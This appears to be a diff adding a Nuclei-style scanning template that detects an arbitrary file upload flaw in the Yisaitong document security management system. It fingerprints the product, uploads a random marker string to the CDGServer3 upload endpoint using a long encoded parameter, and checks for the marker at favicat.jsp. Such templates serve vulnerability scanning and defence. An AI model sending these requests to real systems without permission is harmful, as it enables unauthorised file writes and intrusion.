@@ -1,0 +1,47 @@
+id: poc-yaml-yisaitong-arbitrary-file-upload
+info:
+  name: 易赛通文档安全管理系统任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  r_rand_str: '{{rand_base(32)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CDGServerLanguage"
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCJIIPAFACIJKGABAFFDEDCAHOALGIGLKBFIFBFCGGBJFOGEGG"
+    headers:
+      Content-Type: application/xml;charset=UTF-8
+    body: "{{r_rand_str}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: file-check
+    method: GET
+    path:
+      - "{{BaseURL}}/CDGServer3/favicat.jsp"
+    headers:
+      Content-Type: application/xml;charset=UTF-8
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{r_rand_str}}"
